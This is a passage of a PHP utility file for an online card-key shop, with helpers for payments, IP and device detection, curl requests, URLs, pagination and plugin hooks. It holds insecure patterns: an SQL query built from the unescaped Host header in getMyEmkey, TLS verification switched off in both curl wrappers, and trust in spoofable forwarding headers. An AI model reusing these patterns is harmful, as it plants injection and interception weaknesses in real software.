<?php


function getMyEmkey(){
    $db = Database::getInstance();
    $db_prefix = DB_PREFIX;
    $domain = getTopHost();
    $sql = "select * from {$db_prefix}authorization where domain='{$domain}'";
    $res = $db->once_fetch_array($sql);
    $emkey =  empty($res) ? null : $res['emkey'];
    return $emkey;
}

function isEmail($str) {
    // 使用PHP内置的过滤器验证邮箱
    return filter_var($str, FILTER_VALIDATE_EMAIL) !== false;
}

function isEmpty($var) {
    return is_string($var) && $var === '';
}

function emBcNormalize($number, $scale = 2) {
    if (function_exists('bcadd')) {
        return bcadd((string)$number, '0', (int)$scale);
    }
    return number_format((float)$number, (int)$scale, '.', '');
}

function emBcAdd($left, $right, $scale = 2) {
    if (function_exists('bcadd')) {
        return bcadd((string)$left, (string)$right, (int)$scale);
    }
    return number_format((float)$left + (float)$right, (int)$scale, '.', '');
}

function emBcSub($left, $right, $scale = 2) {
    if (function_exists('bcsub')) {
        return bcsub((string)$left, (string)$right, (int)$scale);
    }
    return number_format((float)$left - (float)$right, (int)$scale, '.', '');
}

function emBcMul($left, $right, $scale = 2) {
    if (function_exists('bcmul')) {
        return bcmul((string)$left, (string)$right, (int)$scale);
    }
    return number_format((float)$left * (float)$right, (int)$scale, '.', '');
}

function emBcDiv($left, $right, $scale = 2) {
    if (function_exists('bcdiv')) {
        return bcdiv((string)$left, (string)$right, (int)$scale);
    }
    $right = (float)$right;
    if ($right == 0.0) {
        return number_format(0, (int)$scale, '.', '');
    }
    return number_format((float)$left / $right, (int)$scale, '.', '');
}

function emBcComp($left, $right, $scale = 2) {
    if (function_exists('bccomp')) {
        return bccomp((string)$left, (string)$right, (int)$scale);
    }

    $factor = pow(10, (int)$scale);
    $leftScaled = (int)round((float)$left * $factor);
    $rightScaled = (int)round((float)$right * $factor);

    if ($leftScaled === $rightScaled) {
        return 0;
    }

    return $leftScaled > $rightScaled ? 1 : -1;
}



// 获取支付方式（仅保留外部直付方式）
function getPayment($balance = true, $goods_payment = []){
    $GLOBALS['mode_payment'] = [];
    doAction('mode_payment');
    $mode_payment = $GLOBALS['mode_payment'];


    if(!empty($goods_payment) && !in_array('all', $goods_payment)){

        foreach($mode_payment as $key => $val){
            if(!in_array($val['unique'], $goods_payment)){
                unset($mode_payment[$key]);
            }
        }
    }

    if(isset($mode_payment[0])){
        $mode_payment[0]['active'] = true;
    }


    return $mode_payment;
}

function generateUUIDv4() {
    return sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff)
    );
}


/**
 * 获取客户端IP
 * @return mixed|string
 */
function getClientIP() {
    $ip = '';

    // 1. 优先检查 HTTP_CLIENT_IP（可能是代理转发）
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  // 2. 检查 HTTP_X_FORWARDED_FOR（多层代理）

        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ipList[0]); // 取第一个IP
    }
    // 3. 最后使用 REMOTE_ADDR
    else {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }

    // 过滤无效IP
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '0.0.0.0';
}

function getPreviousUrl(){
	$previousUrl = $_SERVER['HTTP_REFERER'];  
	return $previousUrl;
}

function getCurrentUrl(){
	// 检查服务器是否使用HTTPS  
	$https = !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off';  
	  
	// 获取协议类型  
	$protocol = $https ? 'https://' : 'http://';  
	  
	// 获取主机名（例如：www.example.com）  
	$host = $_SERVER['HTTP_HOST'];  
	  
	// 获取资源路径（例如：/path/to/myfile.html）  
	$uri = $_SERVER['REQUEST_URI'];  
	  
	// 获取URL  
	$url = $protocol . $host . $uri; 
	return $url;
}

function orderStatusText($status){
    $text = '未知状态';
    if($status == 0) $text = '未支付';
    if($status == 1) $text = '待发货';
    if($status == 2) $text = '已完成';
    if($status == -1) $text = '部分发货';
    if($status == -2) $text = '已取消';
    return $text;
}

function goodsTypeText($goods_type){
    $text = '未知类型';
    if($goods_type == 'duli') $text = '独立卡密';
    if($goods_type == 'xuni') $text = '虚拟服务';
    if($goods_type == 'guding') $text = '固定卡密';
    if($goods_type == 'post') $text = '接口类型';
    return $text;
}


function isFolder($path, $create = false, $permissions = 0755, $recursive = true) {
    // 检查路径是否已经存在
    if (!is_dir($path)) {
        // 尝试创建目录
        if (mkdir($path, $permissions, $recursive)) {
            return true;
        } else {
            echo "目录 {$path} 创建失败。\n";
            return false;
        }
    } else {
        return true;
    }
}

/**
 * 请求接口返回内容
 * @param string $url [请求的URL地址]
 * @param string $params [请求的参数]
 * @param int $ipost [是否采用POST形式]
 * @return  string
 */
function emCurl($url, $params = false, $ispost = 0, $header = false, $timeout = 0) {
    $protocol = substr($url, 0, 5);
    $httpInfo = [];
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'JuheData');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    if ($timeout > 0) {
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    } else {
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    }

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);


    if ($header) {
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }


    if ($ispost) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_URL, $url);
    } else {
        if ($params) {
            curl_setopt($ch, CURLOPT_URL, $url . '?' . $params);
        } else {
            curl_setopt($ch, CURLOPT_URL, $url);
        }
    }
    if ('https' == $protocol) {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    }
    $response = curl_exec($ch);
    if ($response === false) {
        //        echo "cURL Error: " . curl_error($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $httpInfo = array_merge($httpInfo, curl_getinfo($ch));

    curl_close($ch);
    // print_r($httpInfo);
    return $response;
}

/**
 * 请求接口返回内容
 * @param string $url [请求的URL地址]
 * @param string $params [请求的参数]
 * @param int $ipost [是否采用POST形式]
 * @return  string
 */
function ebCurl($url, $params = false, $ispost = 0, $header = false, $timeout = 0) {
    $protocol = substr($url, 0, 5);
    $httpInfo = [];
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'JuheData');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    if ($timeout > 0) {
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    } else {
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    }

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);


    if ($header) {
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }


    if ($ispost) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_URL, $url);
    } else {
        if ($params) {
            curl_setopt($ch, CURLOPT_URL, $url . '?' . $params);
        } else {
            curl_setopt($ch, CURLOPT_URL, $url);
        }
    }
    if ('https' == $protocol) {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    }
    $response = curl_exec($ch);
    if ($response === false) {
        //        echo "cURL Error: " . curl_error($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $httpInfo = array_merge($httpInfo, curl_getinfo($ch));

    curl_close($ch);
    // print_r($httpInfo);
    return $response;
}

/**
 * 判断客户端设备是否为手机
 * 
 * 通过多重检测机制判断当前访问是否来自移动设备（手机）
 * 采用 User Agent 检测、HTTP 头检测、设备前缀检测等多种方式
 * 排除平板设备，专注于手机设备识别
 * 
 * 注意：现代设备生态包括桌面、平板、手机、电视、游戏主机、可穿戴设备等
 * 本函数专注于手机检测，如需更详细的设备分类请使用 DeviceDetector 类
 * 
 * @return bool 返回 true 表示是手机设备，false 表示不是手机设备（包括桌面、平板、其他设备）
 */
function isMobile() {
    // 获取 User Agent 并转为小写，便于匹配
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $is_mobile = false;
    
    // 1. 基础关键字检测（排除平板设备）
    // 检测常见的移动设备关键字，包括操作系统、浏览器类型等
    if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|iphone|ipod|android|xoom)/i', $user_agent)) {
        // 排除平板设备：iPad、Android 平板等
        $tablet_keywords = ['ipad', 'tablet', 'kindle', 'xoom'];
        $is_tablet = false;
        foreach ($tablet_keywords as $keyword) {
            if (strpos($user_agent, $keyword) !== false) {
                $is_tablet = true;
                break;
            }
        }
        
        // 只有在不是平板设备的情况下才标记为手机
        if (!$is_tablet) {
            $is_mobile = true;
        }
    }
    
    // 2. HTTP Accept 头检测
    // 检测是否支持 WAP XHTML 格式，这是移动设备的典型特征
    if (isset($_SERVER['HTTP_ACCEPT']) && 
        strpos(strtolower($_SERVER['HTTP_ACCEPT']), 'application/vnd.wap.xhtml+xml') !== false) {
        $is_mobile = true;
    }
    
    // 3. 特殊 HTTP 头检测
    // X-WAP-Profile 和 HTTP_Profile 是移动设备特有的 HTTP 头
    if (isset($_SERVER['HTTP_X_WAP_PROFILE']) || isset($_SERVER['HTTP_PROFILE'])) {
        $is_mobile = true;
    }
    
    // 4. 移动设备前缀检测
    // 通过检查 User Agent 前4个字符来识别特定移动设备
    $mobile_ua = substr($user_agent, 0, 4);
    $mobile_agents = [
        // 手机厂商和设备类型前缀
        'w3c ', 'acs-', 'alav', 'alca', 'amoi', 'audi', 'avan', 'benq', 'bird', 'blac', 'blaz', 
        'brew', 'cell', 'cldc', 'cmd-', 'dang', 'doco', 'eric', 'hipt', 'inno', 'ipaq', 'java', 
        'jigs', 'kddi', 'keji', 'leno', 'lg-c', 'lg-d', 'lg-g', 'lge-', 'maui', 'maxo', 'midp', 
        'mits', 'mmef', 'mobi', 'mot-', 'moto', 'mwbp', 'nec-', 'newt', 'noki', 'oper', 'palm', 
        'pana', 'pant', 'phil', 'play', 'port', 'prox', 'qwap', 'sage', 'sams', 'sany', 'sch-', 
        'sec-', 'send', 'seri', 'sgh-', 'shar', 'sie-', 'siem', 'smal', 'smar', 'sony', 'sph-', 
        'symb', 't-mo', 'teli', 'tim-', 'tosh', 'tsm-', 'upg1', 'upsi', 'vk-v', 'voda', 'wap-', 
        'wapa', 'wapi', 'wapp', 'wapr', 'webc', 'winw', 'winw', 'xda', 'xda-'
    ];
    if (in_array($mobile_ua, $mobile_agents)) {
        $is_mobile = true;
    }
    
    // 5. Opera Mini 检测
    // Opera Mini 是常用的移动浏览器，需要特殊检测
    if (strpos($user_agent, 'operamini') !== false) {
        $is_mobile = true;
    }
    
    // 6. 操作系统特殊处理
    // 先排除所有 Windows 系统（包括桌面版），再单独处理 Windows Phone
    if (strpos($user_agent, 'windows') !== false && strpos($user_agent, 'windows phone') === false) {
        $is_mobile = false; // 排除桌面版 Windows
    }
    
    // 7. Windows Phone 特殊处理
    // Windows Phone 虽然包含 'windows' 关键字，但确实是移动设备
    if (strpos($user_agent, 'windows phone') !== false) {
        $is_mobile = true;
    }
    
    return $is_mobile;
}

/**
 * 获取用户访问设备类型
 * 
 * 简化的设备类型检测，只返回三种主要类型：手机、平板、电脑
 * 适用于大多数 Web 应用的设备适配需求
 * 
 * @return string 返回设备类型：'mobile'（手机）、'tablet'（平板）、'desktop'（电脑）
 */
function getUserDeviceType() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    
    // 1. 平板设备检测（优先级最高，因为平板 User Agent 可能包含 mobile 关键字）
    if (isTabletDevice($user_agent)) {
        return 'tablet';
    }
    
    // 2. 手机设备检测
    if (isMobile()) {
        return 'mobile';
    }
    
    // 3. 默认为桌面电脑
    return 'desktop';
}

/**
 * 检测是否为平板设备
 * 
 * @param string $user_agent 用户代理字符串
 * @return bool 返回 true 表示是平板设备，false 表示不是平板设备
 */
function isTabletDevice($user_agent = null) {
    if ($user_agent === null) {
        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    }
    
    // 平板设备关键字列表
    $tablet_keywords = [
        'ipad',           // iPad
        'tablet',         // 通用平板
        'kindle',         // Kindle 阅读器
        'xoom',           // Motorola Xoom
        'nook',           // Nook 阅读器
        'transformer',    // ASUS Transformer
        'silk',           // Kindle Silk 浏览器
        'playbook',       // BlackBerry PlayBook
    ];
    
    // 检查是否包含平板关键字
    foreach ($tablet_keywords as $keyword) {
        if (strpos($user_agent, $keyword) !== false) {
            return true;
        }
    }
    
    // Android 平板特殊检测
    // Android 设备如果包含 'mobile' 关键字通常是手机，不包含则可能是平板
    if (strpos($user_agent, 'android') !== false && strpos($user_agent, 'mobile') === false) {
        return true;
    }
    
    return false;
}

/**
 * 获取设备类型的中文名称
 * 
 * @param string $device_type 设备类型（mobile/tablet/desktop）
 * @return string 返回设备类型的中文名称
 */
function getUserDeviceTypeName($device_type = null) {
    if ($device_type === null) {
        $device_type = getUserDeviceType();
    }
    
    $device_names = [
        'mobile' => '手机',
        'tablet' => '平板',
        'desktop' => '电脑'
    ];
    
    return $device_names[$device_type] ?? '未知设备';
}

/**
 * 检测某个值是否存在于二维数组中
 */
function keyValueExistsInArray($array, $key, $value) {
    foreach ($array as $subArray) {
        if (isset($subArray[$key]) && $subArray[$key] == $value) {
            return true;
        }
    }
    return false;
}


function d($arr){
    echo '<pre>'; print_r($arr);
}
function dd($arr){
    echo '<pre>'; var_dump($arr);
}


function emAutoload($class) {

    $class = strtolower($class);
    if (file_exists(EM_ROOT . '/include/model/' . $class . '.php')) {
        require_once(EM_ROOT . '/include/model/' . $class . '.php');
    } elseif (file_exists(EM_ROOT . '/include/lib/' . $class . '.php')) {
        require_once(EM_ROOT . '/include/lib/' . $class . '.php');
    } elseif (file_exists(EM_ROOT . '/include/controller/' . $class . '.php')) {
        require_once(EM_ROOT . '/include/controller/' . $class . '.php');
    } elseif (file_exists(EM_ROOT . '/include/service/' . $class . '.php')) {
        require_once(EM_ROOT . '/include/service/' . $class . '.php');
    }
}


/**
 * Convert HTML Code
 */
function htmlClean($content, $nl2br = true) {
    $content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
    if ($nl2br) {
        $content = nl2br($content);
    }
    $content = str_replace('  ', '&nbsp;&nbsp;', $content);
    $content = str_replace("\t", '&nbsp;&nbsp;&nbsp;&nbsp;', $content);
    return $content;
}

if (!function_exists('getIp')) {
    function getIp() {
        $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $ip = $list[0];
        }
        if (!ip2long($ip)) {
            $ip = '';
        }
        return $ip;
    }
}

/**
 * 获取当前执行脚本的服务器自身IP地址（生产级健壮版，推荐）
 * @return string
 */
function getServerIp()
{
    $serverIp = '';
    // 方式1：优先获取 最准确的服务器本机IP（网页运行模式核心）
    if (isset($_SERVER['SERVER_ADDR']) && filter_var($_SERVER['SERVER_ADDR'], FILTER_VALIDATE_IP)) {
        $serverIp = $_SERVER['SERVER_ADDR'];
    }
    // 方式2：兼容 CLI命令行运行（无Apache/Nginx环境，比如php xxx.php 命令执行）
    elseif (PHP_SAPI === 'cli') {
        $serverIp = gethostbyname(gethostname());
    }
    // 方式3：兜底方案 - 获取本机网卡IP（兼容极少数特殊环境）
    elseif (isset($_SERVER['LOCAL_ADDR']) && filter_var($_SERVER['LOCAL_ADDR'], FILTER_VALIDATE_IP)) {
        $serverIp = $_SERVER['LOCAL_ADDR'];
    }
    // 最终过滤：确保返回合法IP
    return filter_var($serverIp, FILTER_VALIDATE_IP) ? $serverIp : '';
}

if (!function_exists('getUA')) {
    function getUA() {
        return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    }
}
/**
 * 获取当前顶级域名
 */
function getTopHost() {
    $domain = getDomain();
    $domain = strtolower($domain);
    $domain_parts = explode('.', $domain);
    $count = count($domain_parts);
    if ($count < 2) {
        return $domain;
    }
    // 定义常见的双后缀域名列表
    $doubleSuffixes = [
        'com.em', 'eu.cc',
        'co.uk', 'com.cn', 'org.cn', 'net.cn', 'gov.cn', 'ac.cn',
        'eu.org', 'co.jp', 'com.au', 'org.uk', 'com.sg', 'co.nz',
        'co.za', 'com.tw', 'com.hk', 'co.in', 'com.br', 'com.mx'
    ];
    // 检查最后两个部分是否是双后缀
    if ($count >= 3) {
        // 获取最后三部分组成的字符串（如：example.co.uk）
        $lastThree = $domain_parts[$count-3] . '.' . $domain_parts[$count-2] . '.' . $domain_parts[$count-1];
        // 获取最后两部分（如：co.uk）
        $lastTwoParts = $domain_parts[$count-2] . '.' . $domain_parts[$count-1];
        // 检查是否是双后缀
        foreach ($doubleSuffixes as $suffix) {
            // 直接比较最后两部分是否等于后缀
            if ($lastTwoParts === $suffix) {
                // 如果是双后缀，返回最后三部分
                return $lastThree;
            }
        }
    }
    // 普通单后缀
    return $domain_parts[$count-2] . '.' . $domain_parts[$count-1];
}
/**
 * 获取当前完整域名
 */
function getDomain() {

    // 获取主机名（包含子域名）
    $host = '';
    if (isset($_SERVER['HTTP_HOST'])) {
        $host = $_SERVER['HTTP_HOST'];
    } elseif (isset($_SERVER['SERVER_NAME'])) {
        $host = $_SERVER['SERVER_NAME'];
    }
    // 组合完整域名
    return $host;
}

/**
 * 获取站点地址(仅限根目录脚本使用,目前仅用于首页ajax请求)
 */
function getBlogUrl() {
    $phpself = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
    if (preg_match("/^.*\//", $phpself, $matches)) {
        return 'http://' . $_SERVER['HTTP_HOST'] . $matches[0];
    } else {
        return EM_URL;
    }
}

/**
 * 获取当前访问的base url
 */
function realUrl() {
    static $real_url = NULL;
    if ($real_url !== NULL) {
        return $real_url;
    }

    $emlog_path = EM_ROOT . DIRECTORY_SEPARATOR;
    $script_path = pathinfo($_SERVER['SCRIPT_NAME'], PATHINFO_DIRNAME);
    $script_path = str_replace('\\', '/', $script_path);
    $path_element = explode('/', $script_path);

    $this_match = '';
    $best_match = '';
    $current_deep = 0;
    $max_deep = count($path_element);
    while ($current_deep < $max_deep) {
        $this_match = $this_match . $path_element[$current_deep] . DIRECTORY_SEPARATOR;
        if (substr($emlog_path, strlen($this_match) * (-1)) === $this_match) {
            $best_match = $this_match;
        }
        $current_deep++;
    }
    $best_match = str_replace(DIRECTORY_SEPARATOR, '/', $best_match);

    $protocol = 'http://';
    if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') { // 兼容nginx反向代理的情况
        $protocol = 'https://';
    } elseif (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] === 'on' || $_SERVER['HTTPS'] === '1' || $_SERVER['HTTPS'] === 'true' || $_SERVER['HTTPS'] === 1 || $_SERVER['HTTPS'] === true || $_SERVER['HTTPS'] === 'ON')) { // Apache等服务器的HTTPS检测
        $protocol = 'https://';
    }
    $host = $_SERVER['HTTP_HOST'];
    // 保留端口号，避免被 $_SERVER['HTTP_HOST'] 自动截断
    $port = '';
    if (isset($_SERVER['SERVER_PORT']) && !in_array($_SERVER['SERVER_PORT'], [80, 443])) {
        $port = ':' . $_SERVER['SERVER_PORT'];
    }
    $real_url = $protocol . $host . $port . $best_match;
    return $real_url;
}



/**
 * 检查插件
 */
function checkPlugin($plugin) {
    if (is_string($plugin) && preg_match("/^[\w\-\/]+\.php$/", $plugin) && file_exists(EM_ROOT . '/content/plugins/' . $plugin)) {
        return true;
    }

    return false;
}

/**
 * 验证email地址格式
 */
function checkMail($email) {
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        return true;
    }

    return false;
}

/**
 * 截取编码为utf8的字符串
 *
 * @param string $strings 预处理字符串
 * @param int $start 开始处 eg:0
 * @param int $length 截取长度
 */
function subString($strings, $start, $length) {
    $sub_str = mb_substr($strings, $start, $length, 'utf8');
    return mb_strlen($sub_str, 'utf8') < mb_strlen($strings, 'utf8') ? $sub_str . '...' : $sub_str;
}

/**
 * 从可能包含html标记的内容中萃取纯文本摘要
 */
function extractHtmlData($data, $len) {
    $data = subString(strip_tags($data), 0, $len + 30);
    $search = array(
        "/([\r\n])[\s]+/", // 去掉空白字符
        "/&(quot|#34);/i", // 替换 HTML 实体
        "/&(amp|#38);/i",
        "/&(lt|#60);/i",
        "/&(gt|#62);/i",
        "/&(nbsp|#160);/i",
        "/&(iexcl|#161);/i",
        "/&(cent|#162);/i",
        "/&(pound|#163);/i",
        "/&(copy|#169);/i",
        "/\"/i",
    );
    $replace = array(" ", "\"", "&", " ", " ", "", chr(161), chr(162), chr(163), chr(169), "");
    $data = trim(subString(preg_replace($search, $replace, $data), 0, $len));
    return $data;
}

/**
 * 递归复制目录（包含所有子目录和文件）
 * @param string $sourceDir 原目录路径（必须存在）
 * @param string $targetDir 目标目录路径（不存在则自动创建）
 * @param bool $skipSymlink 是否跳过符号链接（默认true，避免循环）
 * @return bool 复制是否成功
 */
function copyDirectory($sourceDir, $targetDir, $skipSymlink = true) {
    // 标准化路径（统一末尾分隔符）
    $sourceDir = rtrim($sourceDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    $targetDir = rtrim($targetDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;

    // 检查原目录是否存在且是目录
    if (!is_dir($sourceDir)) {
        trigger_error("原目录 {$sourceDir} 不存在或不是目录", E_USER_ERROR);
        return false;
    }

    // 自动创建目标目录（含多级目录）
    if (!is_dir($targetDir)) {
        if (!mkdir($targetDir, 0755, true)) {
            trigger_error("目标目录 {$targetDir} 创建失败（权限不足）", E_USER_ERROR);
            return false;
        }
    }

    // 打开原目录并遍历所有内容
    $dirHandle = opendir($sourceDir);
    if (!$dirHandle) {
        trigger_error("无法打开原目录 {$sourceDir}（权限不足）", E_USER_ERROR);
        return false;
    }

    // 遍历目录中的每个项（文件/子目录/隐藏文件）
    while (($item = readdir($dirHandle)) !== false) {
        // 跳过 . 和 ..（当前目录/上级目录）
        if ($item === '.' || $item === '..') {
            continue;
        }

        $sourceItem = $sourceDir . $item; // 原项的完整路径
        $targetItem = $targetDir . $item; // 目标项的完整路径

        // 跳过符号链接（可选）
        if ($skipSymlink && is_link($sourceItem)) {
            continue;
        }

        // 如果是目录：递归复制子目录
        if (is_dir($sourceItem)) {
            if (!copyDirectory($sourceItem, $targetItem, $skipSymlink)) {
                closedir($dirHandle);
                return false;
            }
        }
        // 如果是文件：复制文件（保留权限）
        elseif (is_file($sourceItem)) {
            // copy() 复制文件内容，chmod() 同步权限
            if (!copy($sourceItem, $targetItem)) {
                trigger_error("文件 {$sourceItem} 复制失败", E_USER_WARNING);
                closedir($dirHandle);
                return false;
            }
            // 同步文件权限（可选）
            chmod($targetItem, fileperms($sourceItem));
        }
    }

    // 关闭目录句柄
    closedir($dirHandle);
    return true;
}

/**
 * 转换文件大小单位
 *
 * @param string $fileSize 文件大小 kb
 */
function changeFileSize($fileSize) {
    if ($fileSize >= 1073741824) {
        $fileSize = round($fileSize / 1073741824, 2) . 'GB';
    } elseif ($fileSize >= 1048576) {
        $fileSize = round($fileSize / 1048576, 2) . 'MB';
    } elseif ($fileSize >= 1024) {
        $fileSize = round($fileSize / 1024, 2) . 'KB';
    } else {
        $fileSize .= '字节';
    }
    return $fileSize;
}

/**
 * 获取文件名后缀
 */
function getFileSuffix($fileName) {
    return strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
}

/**
 * 将相对路径转换为完整URL，eg：../content/uploadfile/xxx.jpeg
 */
function getFileUrl($filePath) {
    if (stripos($filePath, 'http') === false) {
        return EM_URL . substr($filePath, 3);
    }
    return $filePath;
}

/**
 * 去除url的参数
 */
function rmUrlParams($url) {
    $urlInfo = explode("?", $url);
    if (empty($urlInfo[0])) {
        return $url;
    }
    return $urlInfo[0];
}

function isImage($mimetype) {
    if (strpos($mimetype, "image") !== false) {
        return true;
    }
    return false;
}

function isVideo($fileName) {
    $suffix = getFileSuffix($fileName);
    return $suffix === 'mp4';
}

function isAudio($fileName) {
    $suffix = getFileSuffix($fileName);
    return $suffix === 'mp3';
}

function isZip($fileName) {
    $suffix = getFileSuffix($fileName);
    if (in_array($suffix, ['zip', 'rar', '7z', 'gz'])) {
        return true;
    }
    return false;
}

/**
 * 分页函数
 *
 * @param int $count 条目总数
 * @param int $perlogs 每页显示条数目
 * @param int $page 当前页码
 * @param string $url 页码的地址
 * @return string
 */
function pagination($count, $perlogs, $page, $url, $anchor = '') {
    $pnums = @ceil($count / $perlogs);
    $re = '';
    $urlHome = preg_replace("|[\?&/][^\./\?&=]*page[=/\-]|", "", $url);

    $frontContent = '';
    $paginContent = '';
    $endContent = '';
    $circle_a = 1;
    $circle_b = $pnums;
    $neighborNum = 1;
    $minKey = 4;

    if ($pnums == 1)
        return $re;
    if ($page >= 1 && $pnums >= 7) {
        $frontContent .= " <a class='btn ghost' href=\"$urlHome$anchor\">1</a> ";
        $frontContent .= " <em class='btn ghost'> ... </em> ";
        $endContent .= " <em class='btn ghost'> ... </em> ";
        $endContent .= " <a class='btn ghost' href=\"$url$pnums$anchor\">$pnums</a> ";
        if ($pnums >= 12) {
            $minKey = 7;
            $neighborNum = 3;
        }
        if ($page < $minKey) {
            $circle_b = $minKey;
            $frontContent = '';
        }
        if ($page > ($pnums - $minKey + 1)) {
            $circle_a = $pnums - $minKey + 1;
            $endContent = '';
        }
        if ($page > ($minKey - 1) && $page < ($pnums - $minKey + 2)) {
            $circle_a = $page - $neighborNum;
            $circle_b = $page + $neighborNum;
        }
        if ($page != 1) {
            $frontContent = " <a class='btn ghost' href=\"$url" . ($page - 1) . "$anchor\" title=\"Previous Page\">&laquo;</a> " . $frontContent;
        }
        if ($page != $pnums) {
            $endContent .= " <a class='btn ghost' href=\"$url" . ($page + 1) . "$anchor\" title=\"Next Page\">&raquo;</a> ";
        }
    }
    for ($i = $circle_a; $i <= $circle_b; $i++) {
        if ($i == $page) {
            $paginContent .= " <span class='btn ghost active'>$i</span> ";
        } elseif ($i == 1) {
            $paginContent .= " <a class='btn ghost' href=\"$urlHome$anchor\">$i</a> ";
        } else {
            $paginContent .= " <a class='btn ghost' href=\"$url$i$anchor\">$i</a> ";
        }
    }
    $re = $frontContent . $paginContent . $endContent;
    return $re;
}

/**
 * 该函数在插件中调用,挂载插件函数到预留的钩子上
 */
function addAction($hook, $actionFunc) {
    // 通过全局变量来存储挂载点上挂载的插件函数
    global $emHooks;
    if (!isset($emHooks[$hook]) || !in_array($actionFunc, $emHooks[$hook])) {
        $emHooks[$hook][] = $actionFunc;
    }
    return true;
}

/**
 * 挂载执行方式1（插入式挂载）：执行挂在钩子上的函数,支持多参数 eg:doAction('post_comment', $author, $email, $url, $comment);
 * eg：在挂载点插入扩展内容
 */
function doAction($hook) {
    global $emHooks;
    $args = array_slice(func_get_args(), 1);
    if (isset($emHooks[$hook])) {
        foreach ($emHooks[$hook] as $function) {
            call_user_func_array($function, $args);
        }
    }
}

/**
 * 挂载执行方式2（单次接管式挂载）：执行挂在钩子上的第一个函数,仅执行行一次，接收输入input，且会修改传入的变量$ret
 * eg：接管文件上传函数，将上传本地改为上传云端
 */
function doOnceAction($hook, $input, &$ret) {
    global $emHooks;
    $args = [$input, &$ret];
    $func = !empty($emHooks[$hook][0]) ? $emHooks[$hook][0] : '';
    if ($func) {
        call_user_func_array($func, $args);
    }
}

/**
 * 挂载执行方式3（多插件协作式挂载）：执行挂在钩子上的所有函数
 *
 * 设计原则：
 * - $input: 原始输入数据，所有插件都能访问，不会被覆盖
 * - $ret: 引用传递的结果，所有插件共享并可修改
 *
 * 使用场景：
 * - 收集型：多个插件向 $ret 添加数据（如订单按钮收集）
 * - 处理型：多个插件依次处理，通过 $ret 传递状态（如发货处理）
 *
 * @param string $hook 钩子名称
 * @param mixed $input 原始输入数据
 * @param mixed &$ret 引用传递的结果
 */
function doMultiAction($hook, $input, &$ret) {
    global $emHooks;
    if (isset($emHooks[$hook])) {
        foreach ($emHooks[$hook] as $function) {
            call_user_func_array($function, [$input, &$ret]);
        }
    }
}

/**
 * 截取文章内容前len个字符
 */
function subContent($content, $len, $clean = 0) {
    if ($clean) {
        $content = strip_tags($content);
    }
    return subString($content, 0, $len);
}

/**
 * 时间转化函数
 * @param $timestamp int 时间戳(秒)
 * @param $format
 * @return false|string
 */
function smartDate($timestamp, $format = 'Y-m-d H:i') {
    $sec = time() - $timestamp;
    if ($sec < 60) {
        $op = $sec . ' 秒前';
    } elseif ($sec < 3600) {
        $op = floor($sec / 60) . " 分钟前";
